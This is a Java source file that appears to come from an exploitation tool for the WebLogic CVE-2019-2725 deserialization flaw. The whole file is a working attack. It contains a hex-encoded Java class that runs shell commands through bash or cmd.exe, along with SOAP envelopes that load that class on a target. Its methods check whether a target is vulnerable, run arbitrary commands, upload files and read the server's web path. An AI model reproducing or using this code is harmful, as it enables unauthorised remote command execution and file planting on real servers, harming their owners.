/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.js.codeexec.paylaod;

import com.js.codeexec.tools.Base64Utils;
import com.js.codeexec.tools.HttpTool;
import java.util.Random;

/**
 *
 * @author shack2
 */
public class CVE_2019_2725_12_2 implements BasePayload {
    private static final String CheckStr="xml_test_ok"; 
    private static final String VULURL="/_async/AsyncResponseService";
    private static final String FileAbsPath="/_async/"; 
    private static final String UploadCheckStr="xml_test_ok";
    
    private static final String responsePath="favicon.ico";
    private static final String HexAPIClass="0xcafebabe000000330105070002010020636f6d2f737570657265616d2f6578706c6f6974732f586d6c415049546573740700040100106a6176612f6c616e672f4f626a6563740100063c696e69743e010003282956010004436f64650a000300090c0005000601000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100224c636f6d2f737570657265616d2f6578706c6f6974732f586d6c415049546573743b0100076765745061746801001428294c6a6176612f6c616e672f537472696e673b01000a457863657074696f6e730700120100136a6176612f6c616e672f457863657074696f6e0a001400160700150100106a6176612f6c616e672f5468726561640c0017001801000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b07001a01001b7765626c6f6769632f776f726b2f457865637574655468726561640a0019001c0c001d001e01000e67657443757272656e74576f726b01001d28294c7765626c6f6769632f776f726b2f576f726b416461707465723b0a000300200c00210022010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0a0024002607002501000f6a6176612f6c616e672f436c6173730c0027000f0100076765744e616d6508002901001c436f6e7461696e6572537570706f727450726f7669646572496d706c0a002b002d07002c0100106a6176612f6c616e672f537472696e670c002e002f010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a080031010011636f6e6e656374696f6e48616e646c65720a002400330c003400350100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0a003700390700380100176a6176612f6c616e672f7265666c6563742f4669656c640c003a003b01000d73657441636365737369626c65010004285a29560a0037003d0c003e003f010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b07004101002f7765626c6f6769632f736572766c65742f696e7465726e616c2f48747470436f6e6e656374696f6e48616e646c65720a004000430c00440045010011676574536572766c65745265717565737401003028294c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c3b0a0047004907004801002c7765626c6f6769632f736572766c65742f696e7465726e616c2f536572766c657452657175657374496d706c0c004a004b01000a676574436f6e7465787401003228294c7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578743b07004d0100176a6176612f6c616e672f537472696e674275696c6465720a004f005107005001002e7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578740c0052005301000e676574526f6f7454656d7044697201001028294c6a6176612f696f2f46696c653b0a0055005707005601000c6a6176612f696f2f46696c650c0058000f01000f6765744162736f6c757465506174680a002b005a0c005b005c01000776616c75654f66010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f537472696e673b0a004c005e0c0005005f010015284c6a6176612f6c616e672f537472696e673b29560800610100052f7761722f0a004c00630c00640065010006617070656e6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275696c6465723b0a004c00670c0068000f010008746f537472696e6708006a01000001000d6578656375746554687265616401001d4c7765626c6f6769632f776f726b2f457865637574655468726561643b01000b776f726b4164617074657201001b4c7765626c6f6769632f776f726b2f576f726b416461707465723b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01001568747470436f6e6e656374696f6e48616e646c65720100314c7765626c6f6769632f736572766c65742f696e7465726e616c2f48747470436f6e6e656374696f6e48616e646c65723b010014776562417070536572766c6574436f6e746578740100304c7765626c6f6769632f736572766c65742f696e7465726e616c2f576562417070536572766c6574436f6e746578743b01000d537461636b4d61705461626c650700770100197765626c6f6769632f776f726b2f576f726b41646170746572010002757008007a0100013a0a002b007c0c007d007e01000573706c6974010027284c6a6176612f6c616e672f537472696e673b295b4c6a6176612f6c616e672f537472696e673b0a0080008207008101001d7765626c6f6769632f736572766c65742f7574696c732f4261736536340c008300840100066465636f6465010016284c6a6176612f6c616e672f537472696e673b295b420800860100055554462d380a002b00880c00050089010017285b424c6a6176612f6c616e672f537472696e673b295608008b010004706174680a002b008d0c008e008f010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0a000100910c000e000f0a009300950700940100187765626c6f6769632f7574696c732f46696c655574696c730c0096008901000b7772697465546f46696c6501000562646174610100124c6a6176612f6c616e672f537472696e673b01000564617461730100135b4c6a6176612f6c616e672f537472696e673b0100026f70010004646174610100025b4207009a0100037361790800a101000b66617669636f6e2e69636f0a002b00a30c00a400a5010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a0a002b00a70c00a800a9010008676574427974657301000428295b420a002b00ab0c00ac000f0100047472696d0a002b00ae0c00af00b00100066c656e6774680100032829490800b201000677686f616d690800b40100076f732e6e616d650a00b600b80700b70100106a6176612f6c616e672f53797374656d0c00b900ba01000b67657450726f7065727479010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b0a002b00bc0c00bd000f01000b746f4c6f776572436173650800bf01000377696e0700c10100136a6176612f7574696c2f41727261794c6973740a00c000090800c40100092f62696e2f626173680b00c600c80700c701000e6a6176612f7574696c2f4c6973740c00c9008f0100036164640800cb0100022d630800cd010007636d642e6578650800cf0100022f630700d10100186a6176612f6c616e672f50726f636573734275696c6465720a00d000d30c000500d4010013284c6a6176612f7574696c2f4c6973743b29560a00d000d60c00d700d801001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b0a00d000da0c00db00dc010005737461727401001528294c6a6176612f6c616e672f50726f636573733b0700de01001d6a6176612f696f2f4279746541727261794f757470757453747265616d0a00dd00090a00e100e30700e20100116a6176612f6c616e672f50726f636573730c00e400e501000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0a00e700e90700e80100136a6176612f696f2f496e70757453747265616d0c00ea00eb01000472656164010005285b4229490a00dd00ed0c00ee00ef0100057772697465010007285b42494929560a00dd00f10c00f200a901000b746f427974654172726179010003636d6401000769734c696e75780100015a0100056f73547970010004636d64730100104c6a6176612f7574696c2f4c6973743b01000e70726f636573734275696c64657201001a4c6a6176612f6c616e672f50726f636573734275696c6465723b01000470726f630100134c6a6176612f6c616e672f50726f636573733b0100156279746541727261794f757470757453747265616d01001f4c6a6176612f696f2f4279746541727261794f757470757453747265616d3b0100045f6275660100014901000362756607009d01000a536f7572636546696c6501000f586d6c415049546573742e6a617661002100010003000000000004000100050006000100070000002f00010001000000052ab70008b100000002000a0000000600010000000d000b0000000c000100000005000c000d00000002000e000f0002001000000004000100110007000000e9000300060000005cb80013c000194c2bb6001b4d2cb6001fb600231228b6002a9900412cb6001f1230b600324e2d04b600362d2cb6003cc000403a041904b60042b600463a05bb004c591905b6004eb60054b80059b7005d1260b60062b60066b01269b000000003000a0000002600090000001000070012000c0013001b001400250015002a001600340017003e00180059001b000b0000003e00060000005c000c000d000000070055006b006c0001000c0050006d006e000200250034006f0070000300340025007100720004003e001b00730074000500750000000b0001fd005907001907007600010078005f0002001000000004000100110007000000d9000400060000004d2b1279b6007b4d2c03324ebb002b592c0432b8007f1285b700873a04128a2db6008c9a001bbb004c592ab70090b80059b7005d1904b60062b600663a042c0532b8007f3a0519051904b80092b100000003000a0000002200080000002000070022000b0023001c002400250026003d002800450029004c002a000b0000003e00060000004d000c000d00000000004d009700980001000700460099009a0002000b0042009b00980003001c0031008b0098000400450008009c009d000500750000000e0001fe003d07009e07002b07002b0001009f005f00020010000000040001001100070000026c0004000c00000111bb004c592ab70090b80059b7005d12a0b60062b600664d2b128ab600a299000c2cb600a62cb80092b1bb002b592bb8007f1285b700874c2bc6000d2bb600aab600ad9a000612b14c043e12b3b800b53a041904c600121904b600bb12beb6002a990005033ebb00c059b700c23a051d990023190512c3b900c5020057190512cab900c502005719052bb900c5020057a70020190512ccb900c5020057190512ceb900c502005719052bb900c5020057bb00d0591905b700d23a06190604b600d5571906b600d93a07bb00dd59b700df3a08110400bc083a091907b600e01909b600e6360aa700191908190903150ab600ec1907b600e01909b600e6360a150a02a0ffe71908b600f03a0b190b2cb80092b100000003000a00000086002100000032001700340020003500280036002900390037003a0045003b0048003d004a003e0051003f0063004000650043006e004500720046007c004700860048008f00490092004a009c004b00a6004c00af004f00ba005000c1005100c8005300d1005400d8005500e4005600e7005700f1005800fd00560103005a010a005c0110005d000b0000007a000c00000111000c000d00000000011100f300980001001700fa008b00980002004a00c700f400f50003005100c000f600980004006e00a300f700f8000500ba005700f900fa000600c8004900fb00fc000700d1004000fd00fe000800d8003900ff009d000900e4002d00af0100000a010a00070101009d000b00750000003d0008fc002907002b1b02fd001c0107002bfc002c0700c61cff0037000b07000107002b07002b0107002b0700c60700d00700e10700dd0701020100001500010103000000020104";
    private static String Check_VUL="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
"                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n" +
"                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
"    <soapenv:Header>\n" +
"        <wsa:Action>fff</wsa:Action>\n" +
"        <wsa:RelatesTo>hello</wsa:RelatesTo>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n" +
"                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string>"+HexAPIClass+"</string>\n" +
"                </void>\n" +
"                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n" +
"                    <void method=\"defineClass\">\n" +
"                        <string>com.supeream.exploits.XmlAPITest</string>\n" +
"                        <object idref=\"cls\"></object>\n" +
"                        <void method=\"newInstance\">\n" +
"                            <void method=\"up\">\n" +
"                                <string>p:%s:%s</string>\n" +
"                            </void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>]]></string></void></class></string>\n" +
"</java></work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body>\n" +
"        <asy:onAsyncDelivery/>\n" +
"    </soapenv:Body>\n" +
"</soapenv:Envelope>";
    
    private static String VUL_CMD="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
"                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n" +
"                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
"    <soapenv:Header>\n" +
"        <wsa:Action>fff</wsa:Action>\n" +
"        <wsa:RelatesTo>hello</wsa:RelatesTo>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n" +
"                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string>"+HexAPIClass+"</string>\n" +
"                </void>\n" +
"                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n" +
"                    <void method=\"defineClass\">\n" +
"                        <string>com.supeream.exploits.XmlAPITest</string>\n" +
"                        <object idref=\"cls\"></object>\n" +
"                        <void method=\"newInstance\">\n" +
"                            <void method=\"say\">\n" +
"                                <string>%s</string>\n" +
"                            </void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>]]></string></void></class></string>\n" +
"</java></work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body>\n" +
"        <asy:onAsyncDelivery/>\n" +
"    </soapenv:Body>\n" +
"</soapenv:Envelope>";
    
    private static Random  rand=new Random();
    private static String UploadFile_VUL_UserPath="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
"                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n" +
"                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
"    <soapenv:Header>\n" +
"        <wsa:Action>fff</wsa:Action>\n" +
"        <wsa:RelatesTo>hello</wsa:RelatesTo>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n" +
"                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string>"+HexAPIClass+"</string>\n" +
"                </void>\n" +
"                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n" +
"                    <void method=\"defineClass\">\n" +
"                        <string>com.supeream.exploits.XmlAPITest</string>\n" +
"                        <object idref=\"cls\"></object>\n" +
"                        <void method=\"newInstance\">\n" +
"                            <void method=\"up\">\n" +
"                                <string>%s</string>\n" +
"                            </void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>]]></string></void></class></string>\n" +
"</java></work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body>\n" +
"        <asy:onAsyncDelivery/>\n" +
"    </soapenv:Body>\n" +
"</soapenv:Envelope>";
    private static String Path_VUL="<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
"<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
"                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n" +
"                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
"    <soapenv:Header>\n" +
"        <wsa:Action>fff</wsa:Action>\n" +
"        <wsa:RelatesTo>hello</wsa:RelatesTo>\n" +
"        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"><java><string><class><string>org.slf4j.ext.EventData</string><void><string><![CDATA[<java>\n" +
"                <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\"><string>"+HexAPIClass+"</string>\n" +
"                </void>\n" +
"                <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n" +
"                    <void method=\"defineClass\">\n" +
"                        <string>com.supeream.exploits.XmlAPITest</string>\n" +
"                        <object idref=\"cls\"></object>\n" +
"                        <void method=\"newInstance\">\n" +
"                            <void method=\"say\">\n" +
"                                <string>path</string>\n" +
"                            </void>\n" +
"                        </void>\n" +
"                    </void>\n" +
"                </void>\n" +
"            </java>]]></string></void></class></string>\n" +
"</java></work:WorkContext>\n" +
"    </soapenv:Header>\n" +
"    <soapenv:Body>\n" +
"        <asy:onAsyncDelivery/>\n" +
"    </soapenv:Body>\n" +
"</soapenv:Envelope>";
    
    
    @Override
    public boolean checkVUL(String url) throws Exception{ 
        try {
            String patload=String.format(Check_VUL,Base64Utils.encode(responsePath),Base64Utils.encode(UploadCheckStr));
            HttpTool.postHttpReuestByXML(url+VULURL, patload,"UTF-8");
            String result=HttpTool.getHttpReuest(url+FileAbsPath+responsePath,"UTF-8");
            if(CheckStr.equals(result)){
                    return true;
            }
        } catch (Exception e) {
           throw e;
        }
        return false;
        
    }

    @Override
    public String exeCMD(String url, String cmd,String encoding)  throws Exception{
        try {
           
            String payload=String.format(VUL_CMD, Base64Utils.encode(cmd));
            HttpTool.postHttpReuestByXML(url+VULURL, payload,encoding);
            return HttpTool.getHttpReuest(url+FileAbsPath+responsePath,encoding);
        } catch (Exception e) {
           throw e;
        }

    }

    @Override
    public String uploadFile(String url,String fileContent, String filename,boolean useUserPath) throws Exception{
         try {
           
            String op="path";
            String respath=filename;
            if(!useUserPath){
                op="file";
                respath=url+FileAbsPath+filename;
            }
            String payload=String.format(UploadFile_VUL_UserPath,op+":"+Base64Utils.encode(filename)+":"+Base64Utils.encode(fileContent));
            HttpTool.postHttpReuestByXML(url+VULURL, payload,"UTF-8");
            return respath;
        } catch (Exception e) {
           throw e;
        }
    }

    @Override
    public String getWebPath(String url) throws Exception {
        try {
            HttpTool.postHttpReuestByXML(url+VULURL, Path_VUL,"UTF-8");
            return HttpTool.getHttpReuest(url+FileAbsPath+responsePath,"UTF-8");
        } catch (Exception e) {
           throw e;
        }
    }
    
}